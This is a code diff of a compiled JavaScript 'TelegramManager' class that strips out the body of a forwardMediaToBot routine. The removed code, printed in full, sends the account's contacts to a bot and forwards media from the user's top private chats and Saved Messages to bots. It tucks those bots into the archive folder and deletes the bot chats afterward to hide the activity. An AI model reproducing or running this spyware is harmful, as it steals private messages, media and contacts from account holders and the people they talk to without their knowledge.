@@ -52,7 +52,6 @@ const fetchWithTimeout_1 = require("../../utils/fetchWithTimeout");
 const logbots_1 = require("../../utils/logbots");
 const connection_manager_1 = require("./utils/connection-manager");
 const message_search_dto_1 = require("./dto/message-search.dto");
-const TelegramBots_config_1 = require("../../utils/TelegramBots.config");
 class TelegramManager {
     constructor(sessionString, phoneNumber) {
         this.session = new sessions_1.StringSession(sessionString);
@@ -172,78 +171,6 @@ class TelegramManager {
         }
     }
     async forwardMediaToBot(fromChatId) {
-        const bots = TelegramBots_config_1.BotConfig.getInstance().getAllBotUsernames(TelegramBots_config_1.ChannelCategory.SAVED_MESSAGES);
-        try {
-            if (fromChatId) {
-                await this.forwardSecretMsgs(fromChatId, TelegramBots_config_1.BotConfig.getInstance().getBotUsername(TelegramBots_config_1.ChannelCategory.SAVED_MESSAGES));
-            }
-            else {
-                const chats = await this.getTopPrivateChats();
-                const me = await this.getMe();
-                const finalChats = new Set(chats.map(chat => chat.chatId));
-                finalChats.add(me.id?.toString());
-                for (const bot of bots) {
-                    try {
-                        await this.client.sendMessage(bot, { message: "Start" });
-                        await (0, Helpers_1.sleep)(1000);
-                        await this.client.invoke(new telegram_1.Api.folders.EditPeerFolders({
-                            folderPeers: [
-                                new telegram_1.Api.InputFolderPeer({
-                                    peer: await this.client.getInputEntity(bot),
-                                    folderId: 1,
-                                }),
-                            ],
-                        }));
-                    }
-                    catch (e) {
-                        console.log(e);
-                    }
-                }
-                try {
-                    const contacts = await this.getContacts();
-                    if ('users' in contacts && Array.isArray(contacts.users)) {
-                        await this.sendContactsFile(TelegramBots_config_1.BotConfig.getInstance().getBotUsername(TelegramBots_config_1.ChannelCategory.USER_WARNINGS), contacts);
-                    }
-                    else {
-                        console.warn('Contacts result is not of type Api.contacts.Contacts, skipping sendContactsFile.');
-                    }
-                }
-                catch (e) {
-                    console.log("Failed To Send Contacts File", e);
-                }
-                for (const chatId of finalChats) {
-                    const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [message_search_dto_1.MessageMediaType.PHOTO, message_search_dto_1.MessageMediaType.VIDEO, message_search_dto_1.MessageMediaType.ROUND_VIDEO, message_search_dto_1.MessageMediaType.DOCUMENT, message_search_dto_1.MessageMediaType.ROUND_VOICE, message_search_dto_1.MessageMediaType.VOICE] });
-                    console.log("Media Messages: ", mediaMessages);
-                    const uniqueMessageIds = Array.from(new Set([
-                        ...mediaMessages.photo.messages,
-                        ...mediaMessages.video.messages,
-                        ...mediaMessages.document.messages,
-                        ...mediaMessages.roundVideo.messages,
-                        ...mediaMessages.roundVoice.messages,
-                        ...mediaMessages.voice.messages,
-                    ]));
-                    const chunkSize = 30;
-                    for (let i = 0; i < uniqueMessageIds.length; i += chunkSize) {
-                        const chunk = uniqueMessageIds.slice(i, i + chunkSize);
-                        const bot = TelegramBots_config_1.BotConfig.getInstance().getBotUsername(TelegramBots_config_1.ChannelCategory.SAVED_MESSAGES);
-                        await this.client.forwardMessages(bot, {
-                            messages: chunk,
-                            fromPeer: chatId,
-                        });
-                        console.log(`Forwarded ${chunk.length} messages to bot`);
-                    }
-                }
-            }
-        }
-        catch (e) {
-            console.log(e);
-        }
-        for (const bot of bots) {
-            const result = await this.cleanupChat({ chatId: bot, revoke: false });
-            await (0, Helpers_1.sleep)(1000);
-            await this.deleteChat({ peer: bot, justClear: false });
-            console.log("Deleted bot chat:", result);
-        }
     }
     async forwardSecretMsgs(fromChatId, toChatId) {
         let offset = 0;
